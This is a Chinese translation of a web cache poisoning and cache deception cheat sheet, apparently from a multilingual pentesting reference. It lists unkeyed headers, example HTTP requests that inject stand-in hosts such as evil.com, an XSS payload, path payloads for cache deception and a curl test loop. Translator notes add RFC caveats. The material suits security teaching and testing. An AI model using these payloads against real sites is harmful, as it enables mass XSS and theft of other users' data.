<a id="-web-cache-poisoning-cheatsheet"></a>
# 💾 Web 缓存投毒速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="./README.it.md">🇮🇹 Versione Italiana</a> | <a href="./README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="./README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

<a id="-what-is-cache-poisoning"></a>
## 🎯 什么是缓存投毒

**Web 缓存投毒（Web Cache Poisoning）**利用缓存行为存储恶意响应，并将这些响应提供给其他用户。

<a id="impact"></a>
### 影响
- 🔴 **大范围 XSS** - 向所有用户提供缓存中的 XSS 响应
- 🔴 **页面篡改** - 缓存恶意内容
- 🔴 **DoS** - 缓存错误响应
- 🔴 **重定向攻击** - 重定向用户

---

<a id="-understanding-caching"></a>
## 🔍 理解缓存机制

<a id="cache-keys"></a>
### 缓存键
```
# 通常按以下内容构成缓存键：
URL + Host 请求头

# 不计入缓存键的内容（unkeyed，是否如此需实测）：
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
自定义请求头
```

<a id="detect-caching"></a>
### 检测缓存
```bash
# 查找与缓存有关的响应头
curl -I https://target.com

# 缓存迹象：
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

<a id="-unkeyed-header-injection"></a>
## 💉 未计入缓存键的请求头注入

<a id="x-forwarded-host"></a>
### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# 若响应反映出 evil.com：
<script src="//evil.com/malicious.js">
```

<a id="x-forwarded-scheme"></a>
### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# 可能引发重定向或协议混淆
Location: http://target.com/
```

<a id="x-host"></a>
### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# 检查是否在响应中反映输入
```

<a id="x-original-url--x-rewrite-url"></a>
### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# 绕过路径限制
```

---

<a id="-attack-techniques"></a>
## 🔥 攻击技巧

<a id="basic-cache-poisoning-xss"></a>
### 基本缓存投毒 XSS
```http
# 1. 查找未计入缓存键且会反映到响应中的输入
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. 含有 XSS 的响应被缓存
# 3. 所有用户从缓存中收到 XSS 响应
```

<a id="cache-poisoning-via-path"></a>
### 通过路径进行缓存投毒
```http
# 请求不同的源站路径
GET /page;evil HTTP/1.1
Host: target.com

# 缓存使用的键可能与预期不同
```

<a id="fat-get-requests"></a>
### 带请求体的 GET 请求（Fat GET）
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# 请求体可能影响响应，却不影响缓存键
```

<a id="parameter-cloaking"></a>
### 参数隐藏（Parameter Cloaking）
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# 缓存与应用的解析方式不同
```

---

<a id="-web-cache-deception"></a>
## 🛠️ Web 缓存欺骗

<a id="different-from-poisoning"></a>
### 与缓存投毒的区别
```
# 缓存投毒：攻击者的载荷被缓存并提供给受害者
# 缓存欺骗：受害者的数据被缓存并提供给攻击者

# Web 缓存欺骗的步骤：
1. 诱使受害者访问：/account/settings.css
2. 服务器返回 /account/settings 的内容（忽略 .css）
3. 缓存将其作为公共资源存储
4. 攻击者从缓存中获取 /account/settings.css
5. 获得受害者的敏感数据
```

<a id="payloads"></a>
### 载荷
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

<a id="-cache-buster-technique"></a>
## 📊 缓存扰动参数技巧（Cache Buster）

<a id="for-testing"></a>
### 用于测试
```http
# 添加 cache buster 参数，避免影响其他用户（须先确认其计入缓存键）
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# 每次测试使用唯一的缓存键（是否唯一需验证）
```

---

<a id="-tools"></a>
## 🛠️ 工具

<a id="param-miner-burp-extension"></a>
### Param Miner（Burp 扩展）
```
1. 从 BApp Store 安装 Param Miner
2. 右键点击请求 → Extensions（扩展）→ Param Miner
3. 选择 "Guess headers"（猜测请求头）
4. 检查未计入缓存键的请求头
```

<a id="manual-testing"></a>
### 手动测试
```bash
# 测试请求头
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

<a id="-common-unkeyed-headers"></a>
## 📋 常见未计入缓存键的请求头

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

<a id="-resources"></a>
## 📚 参考资料

- [PortSwigger Web 缓存投毒](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger 研究文章](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web 缓存欺骗](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

<p align="center">
  <b>💾 缓存投毒！</b><br>
  <i>仅用于已获授权的测试！</i>
</p>

> 译注：缓存键和可缓存性取决于实现与配置。[RFC 9111 第 2 节](https://www.rfc-editor.org/rfc/rfc9111#section-2)将请求方法与目标 URI 作为缓存键的最低组成；Vary 等响应字段还会影响响应复用。本页列出的请求头并非在所有系统中都属于 unkeyed。cache buster 参数只有确实计入缓存键时才能隔离测试；影响范围也仅限于命中相应缓存项的请求。

> 译注：原文的 HTTP 示例保留原样。“Fat GET”中的 Content-Length: 25 与可见请求体 callback=alert(document.domain) 的长度不一致，其他片段也可能省略必需字段或结束标记，不能视为完整的线上请求。[RFC 9110 第 9.3.1 节](https://www.rfc-editor.org/rfc/rfc9110#section-9.3.1)说明 GET 请求内容没有普遍定义的语义，部分实现会拒绝此类请求；分号参数、路径后缀和内部重写是否造成解析差异，同样取决于具体版本与配置。
